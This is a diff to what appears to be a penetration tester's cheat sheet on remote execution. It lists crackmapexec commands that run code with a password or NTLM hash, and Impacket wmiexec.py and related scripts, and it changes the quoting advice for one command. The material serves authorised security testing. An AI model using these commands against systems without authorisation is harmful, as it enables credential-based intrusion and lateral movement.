@@ -45,8 +45,8 @@ Remote Execute
     crackmapexec IP -u username -p='password' (--exec-method smbexec) -X 'powershell cmd'
       - Default exec-method is wmiexec; smbexec will drop as System and wmiexec as user/admin
     crackmapexec IP -u username -H hash
-  Impacket 
-    python /usr/share/doc/python-impacket/examples/wmiexec.py username:password@10.10.5.11 'cmd /c ipconfig'
+  Impacket ** (Best to wrap the command in double quotes than single quotes)
+    python /usr/share/doc/python-impacket/examples/wmiexec.py username:password@10.10.5.11 "cmd /c ipconfig"
       - wmiexec.py, psexec.py, dcomexec.py, atexec.py (Same syntax as above)
       - smbexec.py (Attempts to get a shell on the remote system; no command argument)
     
